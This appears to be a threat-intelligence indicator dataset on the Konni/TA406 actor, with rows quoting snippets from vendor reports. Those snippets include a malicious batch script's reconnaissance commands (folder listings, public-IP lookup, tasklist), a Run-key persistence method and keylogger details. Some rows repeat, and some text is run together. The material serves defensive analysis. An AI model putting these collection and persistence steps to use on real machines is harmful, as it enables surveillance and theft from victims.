1.0.0,actor--konni,artifact--sha256:312d099034c3660a8b4b4f3d0692b6ceeb2dd3ee613a183911be6cc3a2acfb42,observation--sha256:c2fe1697bd78ff6abb29807c966051095c69097cee5a449d974fae6e6fc4a1a2,file-path,C:\Users\%username%\documents\/s,C:\Users\%username%\documents\/s,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 31}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ■'versioninfo.bat' 파일코드분석 ○'versioninfo.bat' 파일은'stopedge.bat' 파일에의해호출되는배치명령입니다.본 파일은 피해자 컴퓨터의주요정보를수집해탈취시도하는정찰기능을수행하게됩니다. @echooffpushd""%~dp0""dir C:\Users\%username%\downloads\/s >%~dp0cuserdown.datadir C:\Users\%username%\documents\/s >%~dp0cuserdocu.datadir C:\Users\%username%\desktop\/s >%~dp0cuserdesk.datadir ""C:\ProgramFiles\"" >%~dp0cprog.datadir ""C:\ProgramFiles (x86)\"" >%~dp0cprog32.datanslookupmyip.opendns.comresolver1.opendns.com>%~dp0ipinfo.datatasklist >%~dp0",
1.0.0,actor--konni,artifact--sha256:aeac038e83beac0d08633a5f83cdab793262930ea4ad5268a2fff3093e0b88ed,observation--sha256:52b57e8f5d40e8b10dbb5fc86a3e7143d4a5fa1981b46c180f2e9226fd36f157,file-path,C:\Users\%username%\downloa,C:\Users\%username%\downloa,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 32}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 31 명령어 기능 설명 dir C:\Users\%username%\downloa ds\ /s > %~dp0cuserdown.txt ‘downloads’ 경로의 (다운로드)파일 및 폴더 목록 정보를 ‘cuserdown.txt’ 파일로 저장 dir C:\Users\%username%\docume nts\ /s > %~dp0cuserdocu.txt ‘documents’ 경로의 (문서)파일 및 폴더 목록 정보를 ‘cuserdocu.txt’ 파일로 저장 dir C:\Users\%username%\desktop \ /s > %~dp0cuserdesk.txt ‘desktop’ 경로의 (바탕화면)파일 및 폴더 목록 정보를 ‘cuserdesk.txt’ 파일로 저장 dir ""C:\Program Files\"" /s > %~dp0cprog.txt ‘Program Files’ 경로의 (프로그램)파일 및 폴더 목록 정",
1.0.0,actor--konni,artifact--sha256:bda82747cc91e075b87036b31476984259008a04cf820a2b5e02e72d24070f56,observation--sha256:d1f6a21e6ff8c51b27b3559cf3c9545a3ed1c832aa280564aaba8dfbb1237bb8,file-path,C:\Users\%username%\downloads\/s,C:\Users\%username%\downloads\/s,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 31}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ■'versioninfo.bat' 파일코드분석 ○'versioninfo.bat' 파일은'stopedge.bat' 파일에의해호출되는배치명령입니다.본 파일은 피해자 컴퓨터의주요정보를수집해탈취시도하는정찰기능을수행하게됩니다. @echooffpushd""%~dp0""dir C:\Users\%username%\downloads\/s >%~dp0cuserdown.datadir C:\Users\%username%\documents\/s >%~dp0cuserdocu.datadir C:\Users\%username%\desktop\/s >%~dp0cuserdesk.datadir ""C:\ProgramFiles\"" >%~dp0cprog.datadir ""C:\ProgramFiles (x86)\"" >%~dp0cprog32.datanslookupmyip.opendns.comresolver1.opendns.com>%~dp0ipinfo.datatasklist >%~dp0",
1.0.0,actor--konni,artifact--sha256:b425d0d7ae7fcdc257295e3be9f83442ad7af88d3864ba845cc4de594ac4fc9a,observation--sha256:ceb7710651acab9bf1198a65b1ab7611c78f48c26f48f4d7e239d6a673c32a47,file-path,E:\Work\_Spyware\VIRUS_2020\Release\Dropper_exe_,E:\Work\_Spyware\VIRUS_2020\Release\Dropper_exe_,candidate,,unknown,unknown,not-stated,,source--konni--5b6e99ac261cea7a,konni/konni-threat-insight-paper-triple-threat-N-Korea-aligned-TA406-steals-scams-spies.pdf,"{""page"": 40}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"The initial dropper, named mt4managre.exe, used a PDB path of: E:\Work\_Spyware\VIRUS_2020\Release\Dropper_exe_ media.pdb. The dropper can have a variable number of embedded payloads, which is defined by the last four bytes (DWORD) of the file (Figure 44). Figure 44. YoreKey dropper encoded config and number of payloads This value is then multiplied by 76 to find the size of the config. The config precedes the last four bytes of the file. This particular dropper only had two embedded payloads, s",
1.0.0,actor--konni,artifact--sha256:a402b88c68391570cdcad26b5857df0ec75aa1ba137c4adecb4355f7f3b1d747,observation--sha256:000123e1fd97e9531a556c7a1df978acf021550248e8d0c2eaed3ef85783975f,registry-key,HKCU\Software\Microsoft\Windows\CurrentVersion\Run,HKCU\Software\Microsoft\Windows\CurrentVersion\Run,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 24}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 23 c. ‘73888454.bat’ ○ VBS 다음에 실행되는 ‘73888454.bat’ 파일은 레지스트리 등록, 피해 컴퓨터 정보 수집 명령 호출, 파일 다운로드 등을 수행합니다. 파일명 73888454.bat MD5 29b3fa2293c63145e544318ca65a67cf SHA1 0fe0379d20570aaaaeac68ac0355feab514c7452 SHA256 14209a0d81a0d05757cf73a18c85cf0a1a6f13a042775430 0031e078ce128c32 [표 07] 73888454.bat 파일 HASH 정보 화면 ○ 본 일괄 배치 파일은 커맨드(CMD) 화면에 수행 내용이 출력되지 않도록 ‘@echo off’ 선언을 합니다. ○ 실행된 배치파일 위치를 저장하기 위해 ‘pushd ""%~dp0""’ 명령을 상단에 추가합니다. 그리고 ‘30966118.bat’ 파일",
1.0.0,actor--konni,artifact--sha256:c5560f7c843029b79d66cd00d9618d24ddf2659e3cdc36f53326eec8165d8f78,observation--sha256:305e17e7a20f28da85babf57a8ad717cf1f5190f036f38eb39f9e1f0a8157df3,registry-key,HKLM\SOFTWARE\ Microsoft\Windows\,HKLM\SOFTWARE\ Microsoft\Windows\,candidate,,unknown,unknown,not-stated,,source--konni--5b6e99ac261cea7a,konni/konni-threat-insight-paper-triple-threat-N-Korea-aligned-TA406-steals-scams-spies.pdf,"{""page"": 38}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Notable TA406 Malware YoreKey YoreKey is a simple Windows keylogger that stores its logs in a plain text file on the infected device. TA406 has used this malware since at least May 2020. The real name the developer(s) gave to this malware is unknown, so Proofpoint named it YoreKey after all C&C URLs have used the /history/ directory and the main purpose of the malware is to record keystrokes. The logs are stored using the following format: %TEMP%\Log.%USERNAME%.bin and prepended with the followi",
